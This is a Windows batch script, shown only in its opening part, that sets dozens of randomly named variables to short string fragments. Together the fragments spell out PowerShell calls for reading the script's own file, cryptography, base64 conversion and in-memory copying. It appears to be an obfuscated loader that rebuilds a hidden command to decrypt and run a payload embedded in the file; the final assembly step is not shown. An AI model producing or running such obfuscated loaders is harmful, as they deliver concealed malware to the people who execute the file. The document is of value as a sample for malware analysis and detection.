@echo off
set "AkjwqFKOxY=Lddj"
set "sAAQoGmMUl=d;$i"
set "PKywhzbxfn='[-1"
set "JOCrfvMwyZ=6] -"
set "fvExrlPTzZ=sGUc"
set "mddyUhnmVu=.Cre"
set "EJZFcuJSVT=Mode"
set "HQVvKfaEto=ay()"
set "sKOyqfVqQH=bjec"
set "mgkFxgogNc=('%~f0'"
set "xSdfItGbgx=[Sys"
set "lETEjtUQcc=$JyC"
set "mRYmpZeaDI=TllA"
set "wzomqXGoxF=ewLi"
set "FbFJKVClkp=nirt"
set "INmvXyGtMK=[IO."
set "gMRfwzDdTL=[-1."
set "lKVIFjNsuW=]::C"
set "CvBDgfvPgl=Conv"
set "URocvvcdho=$iTG"
set "PzsDlMRnpM=ma.I"
set "kevLxHBTGJ=ct S"
set "iGkzjSBIoz=.Cop"
set "gletWfnaqG=Secu"
set "gVYJToSmmK=n ''"
set "tYYNPjrauq=ypto"
set "VBgYmqleAK=pStr"
set "NfYMRqagdW=SI.D"
set "gRlUzFGdOE=).Sp"
set "umCPutKiLC=iUt "
set "FJyYsrSdgb=form"
set "fEokhBBuTl=a.Su"
set "RkIEjmocIw=se()"
set "NmTKGleeHf=t.En"
set "mfGZluofar=m.Re"
set "hyxQlUiNWg=bstr"
set "ujFUgXjqQQ=tion"
set "gGKzhrMxhF=raph"
set "pgncvzwxZa=oint"
set "JQFyWEwTtm=('l0"
